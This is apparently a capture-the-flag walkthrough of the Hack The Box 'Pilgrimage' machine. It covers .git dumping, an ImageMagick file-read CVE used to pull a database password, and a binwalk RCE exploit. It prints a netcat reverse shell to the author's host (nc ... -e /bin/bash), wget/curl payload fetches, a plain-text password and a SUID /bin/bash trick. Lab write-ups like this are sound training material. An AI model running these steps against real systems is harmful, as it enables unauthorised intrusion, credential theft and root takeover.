### nmap
<details>
<summary></summary>

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 15:05 EDT
Nmap scan report for 10.129.179.170
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

Poking around http://pilgrimage.htb you'll find an image shrinker that has the option to authenticate as a user.

First off let's start by doing some enumeration of the directory structure on the server.

``` bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://pilgrimage.htb/
```
This doesn't yield a lot of information, but there is a `HEAD` file in the `.git` directory on the webserver.  
There's a hidden directory on this server called `.git` commonly seen with code repositories.  
If we add `.git/` to our url then we can verify if there is a git directory present.

*Tip from [ziadaligom3a2](https://forum.hackthebox.com/t/official-pilgrimage-discussion/287576/129?u=onisec): there is a browser extention called [dotGit](https://addons.mozilla.org/en-US/firefox/addon/dotgit/) that checks if .git is exposed on the site you are visiting*

``` bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://pilgrimage.htb/.git/
...
/.htpasswd            (Status: 403) [Size: 153]
/.htaccess            (Status: 403) [Size: 153]
/branches             (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/branches/]
/config               (Status: 200) [Size: 92]                                            
/description          (Status: 200) [Size: 73]                                            
/hooks                (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/hooks/]   
/index                (Status: 200) [Size: 3768]                                          
/info                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/info/]    
/logs                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/logs/]    
/objects              (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/] 
/refs                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/refs/] 

```
Rather than trying to enumerate the rest of the directories we want to clone all the files down and read them locally.  

If we look in [Hacktricks: git](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git) we'll see
>To dump a .git folder from a URL use https://github.com/arthaud/git-dumper

>Use https://www.gitkraken.com/ to inspect the content

``` bash
git-dumper http://pilgrimage.htb/.git ~/pilgrimage.htb/
```
This will copy the `.git` directory to `~/pilgrimage.htb/` where we want to look at the respository in gitkraken.  

Since this is a GUI application, I'm not going to demonstrate how to use the application. Instead, poke around with it and see what you can learn.  

What I learned was that there is a user named `emily` and that I could view the php code for the different pages, including such as `index.php` which requires `assets/bulletproof.php` which shows how it processes data being uploaded.  

`index.php` also shows an exec function referencing the magick binary.  

You could read more into this if you'd like, but the important part is we know we're interacting with a binary called `magick`.  

There's also a sqlite database shown in `dashboard.php` located at `/var/db/pilgrimage`  

So we're looking at a few options of attacks that come to mind: sql injection, server side request forgeries, remote code execution, and local file inclusion, at least those were the routes I went down.  

`sqlmap` and `ssrfmap` yielded no results and the php files do not appear to be vulnerable to LFI or RFI based on behavior as well as the source code. So what about this magick binary that processes the files? Is there a way for me to upload something to have it execute code?

Indeed there is! [CVE-2022-44268](https://github.com/Sybil-Scan/imagemagick-lfi-poc)
>ImageMagick 7.1.0-49 is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary remote file (if the ImageMagick binary has permissions to read it).

Using this you can see you can read `/etc/passwd` but it won't be able to get you the `user.txt`

Earlier we saw a sqlite database, we should see if we can get that file and find some credentials.

``` bash
python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
```
Upload the `exploit.png` and download the resulting png file.

``` bash
identify -verbose result.png
```
The `Raw profile type` will be too big to decode at once and you'll notice there's a lot of empty space (represented as a long series of zeros). For this I hear you can use xxd, however I was not able to get that method to work so I will try that more later. 

There is the option of using [Cyberchef](https://gchq.github.io/CyberChef/) but that keeps a lot of filler data that in my opinion is less readable.

What did work for me was decoding small sections using [rapidtables](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html). For ease of readability, I used a text editor to replace long strings of zeroes without removing the lines and then I was able to see where chunks of data were. I put those chunks into rapid tables to eventually find `emily's password`. 

*I did eventually grab the entire sqlite database and view the original only to see there was only the `emily` account, no other credentials and there was no treasure hiding in the dashboard under the `emily` account.*

With that, I tested and confirmed I could ssh into pilgrimage.htb using the `emily` account and password: `abigchonkyboi123`.
``` bash
ssh emily@pilgrimage.htb
id
uid=1000(emily) gid=1000(emily) groups=1000(emily)
cat user.txt
45f358764bf886c14da1c36d91045a06
```
Now that we have a user, we need to escalate to `root`.  
During your enumeration of what you have access to as `emily` you should come across `/usr/sbin/malwarescan.sh` running as `root`.  

We can't sudo, we aren't vulnerable to dirtypipe, and none of the suid binaries are giving us root, so let's look at this malwarescan.sh file.

``` bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done

```

For the rest of the process we'll want multiple SSH sessions with this server. In one we will want to be interacting and in the other we will want to be monitoring with [pspy](https://github.com/DominicBreuker/pspy).
`pspy` does not come with the target system so you will need to get it on the server by downloading it to the target system from a python http server.

With `pspy` running in one terminal, if we upload a file to the webapp we will see the malwarescan.sh run.  
Looking at the code above, we can see `inotifywait` is monitoring the `/var/www/pilgrimage.htb/shrunk/` directory for files being created and when a file is created there it follows the process below it.  

At first glance my first thought was, can I perform command injection using the `filename` variable where `/usr/bin/echo` is reading the file and the answer is no because it is reading the file itself, not the name. We know this because it is being piped to `tail -n 1` which reads the last line of a file and pipes that to `sed` which is using `regex` to look for any string containing the word `CREATE` and replacing it with nothingness.  

So with that out of the way, let's consider what else is in this process. `binwalk` is the next executable and if it detects a script or executable it will delete the file...but it is an executable so is there an exploit for it? Yes.  

[CVE-2022-4510](https://www.exploit-db.com/exploits/51249) is what we will need to escalate to root.  
This is a pretty straight forward exploit generator, we supply it with a `.png` file and the IP and port of our netcat listener.  
To avoid issues, `touch binwalk.png` before going forward.

``` bash
python3 binwalk.py binwalk.png 10.10.14.76 1337

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```
So, now we need to get it on the server. We can't upload it through the webapp because `imagemagick` will convert it, so we will have to serve the `binwalk_exploit.png` with `python3 -m http.server port` and `wget` or `curl` the file from the `ssh` session we have as `emily` getting it on the server is one thing, but it needs to go somewhere specifically. 

Looking at the `malwarescan.sh` we can see binwalk is being fed `$filename` and `filename` is being stored in `/var/www/pilgrimage.htb/shrunk/` so we need to get our crafted `.png` file there.  

As a matter of testing, as I see others have had an issue with this, downloading the file to one directory and moving it to the `shrunk` directory does not trigger `malwarescan.sh` because it is not creating a file but moving it. If you copy it instead, it will trigger the exploit because it is writing a new file. Alternatively, you can just download the exploit directly to the `shrunk` directory.
``` bash
cd /var/www/pilgrimage.htb/shrunk
wget http://10.10.14.76:8080/binwalk_exploit.png

or

curl http://10.10.14.76:8080/binwalk_exploit -o /var/www/pilgrimage.htb/shrunk/exploit.png
```
*Alternatively, you can create the binwalker exploit on the server by pasting the exploit code into your choice of command line text editor available on the server, probably `nano`, and saving it as `binwalker.py` this means no need to have an additional terminal window to run a `python http server` and no need to `wget`/`curl`*
``` bash
touch file.png
python3 binwalk.py file.png 10.10.14.76 1337
cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```
If you look at the output of `pspy` you'll see the exploit run.
``` bash
2023/06/26 10:29:33 CMD: UID=0     PID=2964   | /usr/bin/python3 /usr/local/bin/binwalk -e /var/www/pilgrimage.htb/shrunk/binwalk_exploit.png 
2023/06/26 10:29:33 CMD: UID=0     PID=2965   | sh -c nc 10.10.14.76 1337 -e /bin/bash 2>/dev/null & 
```
In our terminal with our `netcat` listener we'll see a connection as well.
Now you can `cat` your `root.txt` or you can upgrade your `ssh` session by running `chmod +s /bin/bash` and running `bash -p` as `emily`
``` bash
connect to [10.10.14.76] from (UNKNOWN) [10.129.180.185] 42450
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
04c9c7c38d59a436b8d3ac261a10e70e
chmod +s /bin/bash
```

Then back in our `ssh` session as `emily` if we use `bash -p` we should escalate to root.
``` bash
id
uid=1000(emily) gid=1000(emily) euid=0(root) egid=0(root) groups=0(root),1000(emily)
```
With that, this concludes the write-up.
